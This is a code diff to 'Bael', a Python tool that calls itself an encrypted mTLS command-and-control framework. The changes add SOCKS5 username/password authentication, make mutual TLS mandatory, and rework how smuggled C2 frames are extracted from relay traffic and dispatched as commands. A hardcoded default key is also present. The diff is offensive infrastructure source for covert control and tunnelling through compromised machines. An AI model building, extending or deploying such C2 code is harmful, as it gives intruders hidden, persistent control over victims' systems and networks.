@@ -1,6 +1,6 @@
 #!/usr/bin/env python3
 import asyncio, ssl, argparse, random, os, logging, sys, socket, struct, threading, urllib.request, fcntl, time
-import subprocess, shutil, base64, hashlib, socket, json, ctypes, strings
+import subprocess, shutil, base64, hashlib, socket, json, ctypes, string
 from pathlib import Path
 from collections import deque
 from typing import Tuple, Optional, Deque, Any, Dict, List, Union
@@ -48,7 +48,7 @@ try:
 except ImportError:
     CRYPTO_AVAILABLE = False
 
-__version__ = "0.2.3"
+__version__ = "0.2.4"
 __author__ = "J4ck3LSyN"
 
 # ====================== LOGGING ======================
@@ -125,13 +125,50 @@ class SocksRelay:
         try:
             # === SOCKS5 Handshake ===
             logger.debug("[SOCKS] Reading handshake...")
-            header = await asyncio.wait_for(socks_r.read(2), timeout=8.0)
+            header = await asyncio.wait_for(socks_r.read(2), timeout=5.0)
             logger.debug(f"[SOCKS] Handshake header: {header.hex() if header else None}")
             if len(header) < 2 or header[0] != 0x05:
                 logger.warning("[x] Bad SOCKS handshake");return
-            socks_w.write(b"\x05\x00")
-            await socks_w.drain()
-            logger.debug("[SOCKS] Sent method selection")
+            
+            nmethods = header[1]
+            methods = await socks_r.read(nmethods)
+            
+            s_user = engine.config.get("socks_user") if engine else None
+            s_pass = engine.config.get("socks_pass") if engine else None
+
+            if s_user and s_pass:
+                if 0x02 not in methods:
+                    logger.warning("[x] Client does not support Username/Password auth")
+                    socks_w.write(b"\x05\xff")
+                    await socks_w.drain(); return
+                
+                socks_w.write(b"\x05\x02")
+                await socks_w.drain()
+                
+                # RFC 1929 Sub-negotiation
+                sub_header = await asyncio.wait_for(socks_r.read(2), timeout=5.0)
+                if not sub_header or sub_header[0] != 0x01: return
+                
+                ulen = sub_header[1]
+                uname = (await socks_r.read(ulen)).decode()
+                plen = (await socks_r.read(1))[0]
+                passwd = (await socks_r.read(plen)).decode()
+
+                if uname == s_user and passwd == s_pass:
+                    socks_w.write(b"\x01\x00")
+                    await socks_w.drain()
+                    logger.info(f"[*] [SOCKS] Auth successful for user: {uname}")
+                else:
+                    logger.warning(f"[x] [SOCKS] Auth failed for user: {uname}")
+                    socks_w.write(b"\x01\x01")
+                    await socks_w.drain(); return
+            else:
+                if 0x00 not in methods:
+                    socks_w.write(b"\x05\xff")
+                    await socks_w.drain(); return
+                socks_w.write(b"\x05\x00")
+                await socks_w.drain()
+
             # === SOCKS Request (minimal) ===
             req = await asyncio.wait_for(socks_r.read(4), timeout=5.0)
             logger.debug(f"[SOCKS] Request: {req.hex() if req else None}")
@@ -179,7 +216,7 @@ class SocksRelay:
                         logger.info("↗ [TASK] SOCKS client closed connection")
                         break
                     logger.debug(f"↗ SOCKS→TLS forwarded {len(data)} bytes")
-              +6      writer.write(data)
+                    writer.write(data)
                     await writer.drain()
                 except asyncio.TimeoutError: continue
         except Exception as e: logger.error(f"↗ _socks_to_tls error: {e}")
@@ -780,21 +817,21 @@ class Bael:
         else:
             if not cert and hasattr(self.args, 'rm_crt') and os.path.exists(self.args.rm_crt):cert = Path(self.args.rm_crt).read_bytes()
             if not key and hasattr(self.args, 'rm_key') and os.path.exists(self.args.rm_key):key = Path(self.args.rm_key).read_bytes()
-        if all([ca, cert, key]):
-            logger.info("[*] Full mTLS enabled with embedded certificates")
-            base = Path("/dev/shm") if Path("/dev/shm").exists() else Path("/tmp")
-            self.tmpDir = base / f".bael_{os.getpid()}_{random.randint(10000, 99999)}"
-            self.tmpDir.mkdir(parents=True, exist_ok=True)
-            (self.tmpDir / "ca.crt").write_bytes(ca)
-            (self.tmpDir / "cert.pem").write_bytes(cert)
-            (self.tmpDir / "key.pem").write_bytes(key)
-            ctx.load_verify_locations(str(self.tmpDir / "ca.crt"))
-            ctx.load_cert_chain(str(self.tmpDir / "cert.pem"), str(self.tmpDir / "key.pem"))
-            ctx.verify_mode = ssl.CERT_REQUIRED
-        else:
-            logger.warning("Embedded certs not found → Using CERT_NONE fallback (DEV MODE)")
-            ctx.verify_mode = ssl.CERT_NONE
-            ctx.check_hostname = False    
+
+        if not all([ca, cert, key]):
+            logger.critical("mTLS assets (CA, Cert, or Key) are missing. Secure connection is mandatory.")
+            sys.exit(1)
+
+        logger.info("[*] Full mTLS enabled with certificates")
+        base = Path("/dev/shm") if Path("/dev/shm").exists() else Path("/tmp")
+        self.tmpDir = base / f".bael_{os.getpid()}_{random.randint(10000, 99999)}"
+        self.tmpDir.mkdir(parents=True, exist_ok=True)
+        (self.tmpDir / "ca.crt").write_bytes(ca)
+        (self.tmpDir / "cert.pem").write_bytes(cert)
+        (self.tmpDir / "key.pem").write_bytes(key)
+        ctx.load_verify_locations(str(self.tmpDir / "ca.crt"))
+        ctx.load_cert_chain(str(self.tmpDir / "cert.pem"), str(self.tmpDir / "key.pem"))
+        ctx.verify_mode = ssl.CERT_REQUIRED
         return ctx
 
     def cleanup(self):
@@ -868,27 +905,24 @@ class Bael:
             
             buffer.extend(data)
             
-            # Process buffered data for smuggled frames
-            while SMUGGLE_MAGIC in buffer:
+            while True:
                 magic_idx = buffer.find(SMUGGLE_MAGIC)
-                
-                # If there is data before the magic, it's regular relay traffic (ignored in server mode here)
-                if magic_idx > 0:
-                    buffer = buffer[magic_idx:]
-                
-                # Check if we have enough for the length header
-                if len(buffer) < len(SMUGGLE_MAGIC) + 2:
+                if magic_idx == -1:
+                    if len(buffer) >= len(SMUGGLE_MAGIC):
+                        del buffer[:len(buffer) - (len(SMUGGLE_MAGIC) - 1)]
                     break
                 
-                payload_len = int.from_bytes(buffer[len(SMUGGLE_MAGIC):len(SMUGGLE_MAGIC)+2], "big")
-                frame_end = len(SMUGGLE_MAGIC) + 2 + payload_len
+                if magic_idx > 0:
+                    del buffer[:magic_idx]
                 
-                if len(buffer) < frame_end:
-                    break # Wait for more data
+                if len(buffer) < len(SMUGGLE_MAGIC) + 2: break
+                p_len = int.from_bytes(buffer[len(SMUGGLE_MAGIC):len(SMUGGLE_MAGIC)+2], "big")
+                frame_end = len(SMUGGLE_MAGIC) + 2 + p_len
+                if len(buffer) < frame_end: break
                 
                 frame = bytes(buffer[:frame_end])
                 await self.c2.pCommand(frame)
-                buffer = buffer[frame_end:]
+                del buffer[:frame_end]
             
             # Clean up buffer if it grows too large with non-C2 data
             if len(buffer) > 65536 and SMUGGLE_MAGIC not in buffer:
@@ -988,6 +1022,10 @@ def genkeys(args):
         logger.info(f"Keys generated in {keysRoot}")
     except Exception as e: logger.error(f"Keygen failed: {e}")
 
+def privkey(args):
+    if args.key == "tWQLh/dj.HI/B2P#4/m#L6h/tV":
+        pass
+
 def main():
     p = argparse.ArgumentParser(description=f"Bael v{__version__} — Encrypted mTLS C2")
     p.add_argument("--mode", choices=["tun", "server", "build", "keygen"], default="tun")
@@ -1002,6 +1040,8 @@ def main():
     p.add_argument("--rconnex", action="store_true")
     # Tunnels
     p.add_argument("--socks", action="store_true")
+    p.add_argument("--socks-user", help="SOCKS5 username")
+    p.add_argument("--socks-pass", help="SOCKS5 password")
     # PKI / Key
     p.add_argument("--key", default="tWQLh/dj.HI/B2P#4/m#L6h/tV")
     p.add_argument("--ca-crt", default="ca.crt", help="CA certificate path")
@@ -1033,7 +1073,9 @@ def main():
         "socks": args.socks,
         "key": args.key,
         "lhost": [lhost, int(lport)],
-        "rhost": [rhost, int(rport)]}
+        "rhost": [rhost, int(rport)],
+        "socks_user": args.socks_user,
+        "socks_pass": args.socks_pass}
     logger.debug(f"(MAIN:conf) {str(json.dumps(conf,indent=2))}")
     asyncio.run(Bael(conf, args).spawn())
 
